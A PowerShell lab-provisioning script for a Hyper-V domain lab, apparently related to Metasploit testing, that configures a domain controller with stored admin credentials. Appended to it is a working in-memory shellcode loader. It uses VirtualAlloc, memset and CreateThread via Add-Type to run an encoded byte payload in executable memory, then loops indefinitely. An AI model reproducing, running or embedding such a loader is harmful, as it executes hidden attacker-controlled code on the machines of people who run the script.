
Import-Module C:\git-repositories\PowerShell\MSFVMLab\MSFVMLab.psm1 -Force

$LabConfig = Get-Content C:\git-repositories\PowerShell\MSFVMLab\LabVMS.json | ConvertFrom-Json
$WorkingDirectory = $LabConfig.WorkingDirectory
$Domain = $LabConfig.Domain


$dc = ( $LabConfig.Servers | Where-Object {$_.Class -eq 'DomainController'}).Name

$DomainCred = Import-Clixml "$WorkingDirectory\vmlab_domainadmin.xml"

Invoke-Command -VMName $dc -ScriptBlock {. C:\Temp\VMDSC.ps1 -DName "$using:Domain.com" -DCred $using:DomainCred} -Credential $DomainCred   
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdf,0xb8,0xe6,0x51,0x19,0xe4,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x43,0x14,0x03,0x43,0xf2,0xb3,0xec,0x18,0x12,0xb1,0x0f,0xe1,0xe2,0xd6,0x86,0x04,0xd3,0xd6,0xfd,0x4d,0x43,0xe7,0x76,0x03,0x6f,0x8c,0xdb,0xb0,0xe4,0xe0,0xf3,0xb7,0x4d,0x4e,0x22,0xf9,0x4e,0xe3,0x16,0x98,0xcc,0xfe,0x4a,0x7a,0xed,0x30,0x9f,0x7b,0x2a,0x2c,0x52,0x29,0xe3,0x3a,0xc1,0xde,0x80,0x77,0xda,0x55,0xda,0x96,0x5a,0x89,0xaa,0x99,0x4b,0x1c,0xa1,0xc3,0x4b,0x9e,0x66,0x78,0xc2,0xb8,0x6b,0x45,0x9c,0x33,0x5f,0x31,0x1f,0x92,0xae,0xba,0x8c,0xdb,0x1f,0x49,0xcc,0x1c,0xa7,0xb2,0xbb,0x54,0xd4,0x4f,0xbc,0xa2,0xa7,0x8b,0x49,0x31,0x0f,0x5f,0xe9,0x9d,0xae,0x8c,0x6c,0x55,0xbc,0x79,0xfa,0x31,0xa0,0x7c,0x2f,0x4a,0xdc,0xf5,0xce,0x9d,0x55,0x4d,0xf5,0x39,0x3e,0x15,0x94,0x18,0x9a,0xf8,0xa9,0x7b,0x45,0xa4,0x0f,0xf7,0x6b,0xb1,0x3d,0x5a,0xe3,0x76,0x0c,0x65,0xf3,0x10,0x07,0x16,0xc1,0xbf,0xb3,0xb0,0x69,0x37,0x1a,0x46,0x8e,0x62,0xda,0xd8,0x71,0x8d,0x1b,0xf0,0xb5,0xd9,0x4b,0x6a,0x1c,0x62,0x00,0x6a,0xa1,0xb7,0xbd,0x6f,0x35,0xb5,0xbd,0xe7,0xc0,0xad,0x43,0x08,0xcb,0x91,0xcd,0xee,0x9b,0xb9,0x9d,0xbe,0x5b,0x6a,0x5e,0x6f,0x33,0x60,0x51,0x50,0x23,0x8b,0xbb,0xf9,0xc9,0x64,0x12,0x51,0x65,0x1c,0x3f,0x29,0x14,0xe1,0x95,0x57,0x16,0x69,0x1a,0xa7,0xd8,0x9a,0x57,0xbb,0x8c,0x6a,0x22,0xe1,0x1a,0x74,0x98,0x8c,0xa2,0xe0,0x27,0x07,0xf5,0x9c,0x25,0x7e,0x31,0x03,0xd5,0x55,0x4a,0x8a,0x43,0x16,0x24,0xf3,0x83,0x96,0xb4,0xa5,0xc9,0x96,0xdc,0x11,0xaa,0xc4,0xf9,0x5d,0x67,0x79,0x52,0xc8,0x88,0x28,0x07,0x5b,0xe1,0xd6,0x7e,0xab,0xae,0x29,0x55,0x2d,0x92,0xff,0x93,0x5b,0xfa,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

